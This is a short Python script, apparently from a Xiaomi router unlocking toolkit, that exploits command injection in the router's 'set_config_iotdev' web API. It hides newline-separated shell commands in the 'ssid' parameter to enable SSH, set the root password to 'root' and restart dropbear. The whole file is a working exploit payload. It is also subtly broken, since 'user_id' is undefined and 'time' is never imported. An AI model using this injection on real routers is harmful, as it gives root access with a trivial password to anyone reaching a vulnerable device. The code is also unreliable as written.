#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import types
import platform
import ctypes
import binascii
import re
import requests
import urllib

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from gateway import *


gw = Gateway(timeout = 4)
if gw.status < 1:
  die("Xiaomi Mi Wi-Fi device not found (IP: {})".format(gw.ip_addr))

print("device_name =", gw.device_name)
print("rom_version = {} {}".format(gw.rom_version, gw.rom_channel))
print("mac address = {}".format(gw.mac_address))

gw.ssh_port = 22
if gw.ping(verbose = 0) is True:
  die(0, "Stock SSH server already installed and running")

stok = gw.web_login()

def exec_cmd(cmd):
  params = { 'bssid': 'Xiaomi', 'user_id': user_id, 'ssid': ('-h' + '\n' + cmd + '\n') }
  res = requests.get(gw.apiurl + "set_config_iotdev", params = params)

exec_cmd('nvram set ssh_en=1; nvram commit;')
exec_cmd('echo -e "root\\nroot" | passwd root')
exec_cmd("sed -i 's/channel=.*/channel=\"debug\"/g' /etc/init.d/dropbear")
exec_cmd("/etc/init.d/dropbear stop")
exec_cmd("/etc/init.d/dropbear start")

time.sleep(0.5)
gw.ping()

print("")
print("#### Connection to device {} is OK ####".format(gw.device_name))

